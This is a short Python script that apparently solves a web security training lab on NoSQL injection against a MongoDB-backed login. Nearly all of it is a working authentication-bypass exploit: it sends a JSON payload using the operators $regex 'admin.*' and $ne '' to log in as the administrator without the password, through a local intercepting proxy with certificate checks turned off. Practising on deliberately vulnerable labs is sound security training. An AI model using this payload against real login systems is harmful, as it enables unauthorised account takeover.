'''
The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection using MongoDB operators.

To solve the lab, log into the application as the administrator user.

You can log in to your own account using the following credentials: wiener:peter. 
'''

import requests

proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}

url = "https://0aa700a50458b230826675e00062009e.web-security-academy.net"

s = requests.Session()
s.proxies.update(proxies)
s.verify = False

# tested payload with $regex:wien.* first to see if auth bypass work
payload = {
    "username":{
        "$regex":"admin.*"
    },
    "password":{
        "$ne":""
    }
}

s.post(f"{url}/login", json=payload)